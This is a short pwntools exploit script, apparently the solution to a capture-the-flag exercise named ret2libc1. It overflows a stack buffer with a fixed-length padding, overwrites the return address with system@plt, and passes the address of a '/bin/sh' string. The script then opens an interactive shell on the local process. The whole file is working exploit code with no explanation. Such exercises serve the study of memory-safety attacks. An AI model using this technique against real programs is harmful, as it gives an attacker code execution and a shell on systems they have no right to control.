from pwn import *

sh = process('./rop/ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
offset = 0x6c+4


payload = b'A' * offset+p32(system_plt)+p32(0xcccccccc)+p32(binsh_addr)
sh.sendline(payload)

sh.interactive()